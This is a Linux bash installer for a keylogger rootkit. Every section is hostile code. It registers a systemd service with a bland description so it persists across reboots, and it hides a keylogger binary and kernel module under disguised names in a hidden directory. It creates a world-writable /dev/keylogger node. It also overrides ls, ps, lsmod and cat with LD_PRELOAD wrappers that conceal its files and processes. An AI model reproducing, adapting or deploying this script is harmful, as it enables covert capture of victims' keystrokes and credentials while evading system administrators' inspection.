#!/bin/bash

# Ensure execution with root privileges
if [ "$EUID" -ne 0 ]; then 
  echo "[-] Please run as root (sudo)"
  exit
fi

SCRIPT=$(realpath "$0")
DIR=$(dirname "$SCRIPT")

if [ "$1" != "run" ]; then
    cat <<EOF > /etc/systemd/system/keylogger.service
[Unit]
Description=System Service
After=multi-user.target

[Service]
Type=forking
ExecStart=$SCRIPT run
User=root
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable --now keylogger.service > /dev/null 2>&1
    exit 0
fi

cd "$DIR"

# 1. Compilation Step for the Hook Library (if source exists)
if [ -f "stealth_hook.c" ]; then
    echo "[+] Compiling hide library (stealth_hook.c)..."
    gcc -fPIC -shared -o stealth_hook.so stealth_hook.c -ldl
    if [ $? -ne 0 ]; then
        echo "[-] Error: Compilation of stealth_hook.c failed!"
        exit 1
    fi
fi

# Define stealth path
HIDDEN_DIR="/usr/local/.system_data"
mkdir -p "$HIDDEN_DIR"

# 2. Copy binary, kernel module, and the compiled SO library to hidden location
if [ -f "client" ] && [ -f "keylogger.ko" ]; then
    cp client "$HIDDEN_DIR/kworker_d"
    cp keylogger.ko "$HIDDEN_DIR/sys_mod.ko"
    chmod +x "$HIDDEN_DIR/kworker_d"
fi

if [ -f "stealth_hook.so" ]; then
    cp stealth_hook.so "$HIDDEN_DIR/stealth_hook.so"
    chmod +x "$HIDDEN_DIR/stealth_hook.so"
    cp stealth_hook.so /lib/hider.so
    chmod 755 /lib/hider.so
fi

# 3. Kernel module setup and device node creation
if ! grep -q "keylogger" /proc/devices; then
    if [ -f "$HIDDEN_DIR/sys_mod.ko" ]; then
        /sbin/insmod "$HIDDEN_DIR/sys_mod.ko" > /dev/null 2>&1
    fi
fi

sleep 1

MAJOR=$(awk '$2=="keylogger" {print $1}' /proc/devices)
if [ -n "$MAJOR" ]; then
    rm -f /dev/keylogger
    mknod /dev/keylogger c $MAJOR 0
    chmod 666 /dev/keylogger
fi

# 4. Setup Wrapper Binaries in /usr/local/bin (Global PATH override for ls, ps, lsmod, and cat)
cat <<'EOF' > /usr/local/bin/ls
#!/bin/bash
LD_PRELOAD=/lib/hider.so /bin/ls "$@"
EOF

cat <<'EOF' > /usr/local/bin/ps
#!/bin/bash
LD_PRELOAD=/lib/hider.so /bin/ps "$@"
EOF

cat <<'EOF' > /usr/local/bin/lsmod
#!/bin/bash
LD_PRELOAD=/lib/hider.so /sbin/lsmod "$@"
EOF

cat <<'EOF' > /usr/local/bin/cat
#!/bin/bash
LD_PRELOAD=/lib/hider.so /bin/cat "$@"
EOF

chmod +x /usr/local/bin/ls
chmod +x /usr/local/bin/ps
chmod +x /usr/local/bin/lsmod
chmod +x /usr/local/bin/cat

# 5. Run client immediately under stealth hook
killall -9 kworker_d > /dev/null 2>&1
killall -9 client > /dev/null 2>&1

if [ -x "$HIDDEN_DIR/kworker_d" ]; then
    LD_PRELOAD=/lib/hider.so "$HIDDEN_DIR/kworker_d" > /dev/null 2>&1 &
fi

echo "[+] Stealth setup and execution complete."
exit 0